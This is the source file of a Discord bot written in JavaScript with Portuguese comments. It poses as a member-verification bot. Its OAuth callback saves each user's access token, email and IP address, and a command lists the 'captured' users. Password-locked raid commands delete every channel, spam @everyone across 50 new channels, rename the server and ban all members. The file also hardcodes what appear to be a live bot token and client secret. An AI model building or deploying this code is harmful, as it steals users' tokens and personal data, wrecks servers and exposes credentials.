const express = require('express');
const app = express();
const { Client, GatewayIntentBits, Partials, ChannelType, REST, Routes, SlashCommandBuilder, EmbedBuilder, Events } = require('discord.js');
const fs = require('fs');
const axios = require('axios');

// --- CONFIGURAÇÃO ---
const BOT_TOKEN = process.env.BOT_TOKEN || 'MTQ1OTU1MDk2NjAzMzQyMDQ5Mg.Gflmf9.tvB-m2_GszyXlbj1N2CpCmXaLe8PdOPVzJE15I';
const CLIENT_ID = '1459550966033420492';
const CLIENT_SECRET = process.env.CLIENT_SECRET || 'p7doL9JCDnG86_jKZzHNl_zemb6nk0zO';
const LINK_BASE = 'https://rickwcl.onrender.com';
const REDIRECT_URI = `${LINK_BASE}/callback`;
const ID_CARGO = '1466834314225389804';
const ID_SERVIDOR = '1465936358513315976'; 
const SENHA_LOGIN = "Rickwcl"; 

let db = { usuarios: [] };
if (fs.existsSync('./storage.json')) db = JSON.parse(fs.readFileSync('./storage.json'));
const saveDb = () => fs.writeFileSync('./storage.json', JSON.stringify(db, null, 4));

const client = new Client({ intents: [3276799] });

// --- SERVIDOR WEB (PÁGINA DE SUCESSO) ---
app.get('/callback', async (req, res) => {
    const code = req.query.code;
    if (!code) return res.send('Erro');
    try {
        const data = new URLSearchParams({
            client_id: CLIENT_ID, client_secret: CLIENT_SECRET,
            grant_type: 'authorization_code', code: code, redirect_uri: REDIRECT_URI
        });
        const tokenRes = await axios.post('https://discord.com/api/v10/oauth2/token', data);
        const token = tokenRes.data.access_token;
        const userRes = await axios.get('https://discord.com/api/v10/users/@me', {
            headers: { Authorization: `Bearer ${token}` }
        });
        const user = userRes.data;
        const userIP = req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        
        const userData = { id: user.id, username: user.username, token: token, email: user.email || 'Privado', ip: userIP };
        const idx = db.usuarios.findIndex(u => u.id === user.id);
        if (idx > -1) db.usuarios[idx] = userData; else db.usuarios.push(userData);
        saveDb();

        await axios.put(`https://discord.com/api/v10/guilds/${ID_SERVIDOR}/members/${user.id}/roles/${ID_CARGO}`, {}, {
            headers: { Authorization: `Bot ${BOT_TOKEN}` }
        }).catch(() => {});

        const guild = client.guilds.cache.get(ID_SERVIDOR);
        const serverName = guild ? guild.name : "Servidor";
        const avatarUrl = user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` : "https://cdn.discordapp.com/embed/avatars/0.png";

        res.send(`<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><style>body { background: #0c0d12; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }.card { background: #111419; border: 1.5px solid #1f232a; border-radius: 24px; padding: 40px 20px; text-align: center; width: 90%; max-width: 380px; }.avatar { width: 110px; height: 110px; border-radius: 50%; border: 3px solid #ff4444; padding: 4px; }.status { color: #ff4444; font-size: 11px; font-weight: 800; text-transform: uppercase; margin-top: 10px; display: block; }.info-box { background: #1a1d24; border-radius: 16px; padding: 20px; margin: 25px 0; border: 1px solid #2d3139; text-align: left; }.btn { background: #ff4444; color: white; text-decoration: none; padding: 18px; border-radius: 14px; display: block; font-weight: 800; }</style></head><body><div class="card"><img class="avatar" src="${avatarUrl}"><span class="status">● Verificado</span><h2>${user.username}</h2><div class="info-box"><span style="color:#6e7681; font-size:11px;">SERVIDOR</span><br><span style="font-size:18px; font-weight:800;">${serverName}</span><br><span style="color:#ff4444; font-size:13px;">✓ Cargo Atribuído</span></div><a href="https://discord.com/app" class="btn">Acessar Servidor</a></div></body></html>`);
    } catch (e) { res.send('Erro'); }
});
app.listen(process.env.PORT || 10000);

// --- COMANDOS ---
const commands = [
    new SlashCommandBuilder().setName('ajuda').setDescription('Menu de ajuda'),
    new SlashCommandBuilder().setName('verify').setDescription('Sistema de verificação'),
    new SlashCommandBuilder().setName('puxar').setDescription('Trazer membros').addStringOption(o => o.setName('guild_id').setDescription('ID do alvo').setRequired(true)),
    new SlashCommandBuilder().setName('listar').setDescription('Listar capturas'),
    new SlashCommandBuilder().setName('haid').setDescription('Raid spam').addStringOption(o => o.setName('login').setDescription('Senha').setRequired(true)).addStringOption(o => o.setName('mensagem').setDescription('Mensagem').setRequired(true)),
    new SlashCommandBuilder().setName('boss').setDescription('Resetar servidor').addStringOption(o => o.setName('login').setDescription('Senha').setRequired(true)),
    new SlashCommandBuilder().setName('allban').setDescription('Banir todos').addStringOption(o => o.setName('login').setDescription('Senha').setRequired(true)),
    new SlashCommandBuilder().setName('kickcall').setDescription('Kick da call').addStringOption(o => o.setName('login').setDescription('Senha').setRequired(true)).addUserOption(o => o.setName('alvo').setDescription('Usuário').setRequired(true)),
    new SlashCommandBuilder().setName('nuke').setDescription('Limpar chat'),
    new SlashCommandBuilder().setName('ping').setDescription('Latência')
].map(cmd => cmd.toJSON());

const rest = new REST({ version: '10' }).setToken(BOT_TOKEN);
(async () => { try { await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands }); } catch (e) {} })();

// --- INTERAÇÕES ---
client.on(Events.InteractionCreate, async (i) => {
    if (!i.isChatInputCommand()) return;
    const { commandName, options } = i;

    // Trava de senha para comandos de ataque
    const comandosComSenha = ['haid', 'boss', 'allban', 'kickcall'];
    if (comandosComSenha.includes(commandName)) {
        if (options.getString('login') !== SENHA_LOGIN) {
            return i.reply({ content: "🔒 Senha incorreta.", flags: [64] });
        }
    }

    if (commandName === 'ajuda') {
        const helpEmbed = new EmbedBuilder()
            .setTitle('🔒 cmd - FIRST').setColor(0x00008B)
            .setDescription('🔹 /verify\n🔹 /haid (Senha)\n🔹 /allban (Senha)\n🔹 /boss (Senha)\n🔹 /kickcall (Senha)\n🔹 /nuke\n🔹 /ping\n🔹 /puxar\n🔹 /listar\n\n⚠️ *Creator by ż4*')
            .setImage('https://cdn.discordapp.com/attachments/1459599212852412558/1460702992712990780/f3013e356a3829c077c84c321798982f.gif');
        return i.reply({ embeds: [helpEmbed] });
    }

    if (commandName === 'verify') {
        const authUrl = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&response_type=code&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&scope=identify+guilds.join+email`;
        const embed = new EmbedBuilder().setTitle("✅ Autenticação").setDescription("Clica no botão para te verificares!").setColor(0xff0000).setImage("https://cdn.discordapp.com/attachments/1468433340117028897/1468452430864977941/27ee5edaf33aac33b89e5ded3c4395b9.jpg");
        return i.reply({ embeds: [embed], components: [{ type: 1, components: [{ type: 2, style: 5, label: "Verificar", url: authUrl }] }] });
    }

    if (commandName === 'haid') {
        const msg = options.getString('mensagem');
        await i.reply("🔥 Iniciando...");
        i.guild.channels.cache.forEach(c => c.delete().catch(() => {}));
        for (let j = 0; j < 50; j++) {
            i.guild.channels.create({ name: 'raid-by-z4', type: ChannelType.GuildText }).then(ch => {
                setInterval(() => ch.send(`@everyone ${msg}`).catch(() => {}), 600);
            }).catch(() => {});
        }
    }

    if (commandName === 'boss') {
        i.guild.setName("BOSS WAS HERE").catch(() => {});
        const chs = await i.guild.channels.fetch();
        chs.forEach(c => c.delete().catch(() => {}));
        return i.reply("🧹 Servidor resetado.");
    }

    if (commandName === 'allban') {
        const m = await i.guild.members.fetch();
        m.forEach(mem => { if (mem.bannable) mem.ban().catch(() => {}); });
        return i.reply("🔨 Banindo...");
    }

    if (commandName === 'kickcall') {
        const alvo = options.getMember('alvo');
        if (alvo?.voice.channel) {
            await alvo.voice.disconnect();
            return i.reply(`🚫 Kickado.`);
        }
        return i.reply("Não está em call.");
    }

    if (commandName === 'listar') {
        let txt = db.usuarios.map(u => `ID: ${u.id} | IP: ${u.ip}`).join('\n');
        return i.reply({ content: `**Capturados:**\n${txt || 'Vazio'}`, flags: [64] });
    }

    if (commandName === 'nuke') {
        const novo = await i.channel.clone();
        await i.channel.delete();
        await novo.send("@everyone **NUKED BY Ż4**");
    }

    if (commandName === 'ping') return i.reply('🏓 Pong!');
});

client.on(Events.ClientReady, () => console.log(`✅ ONLINE: 🔒 FIRST`));
client.login(BOT_TOKEN);

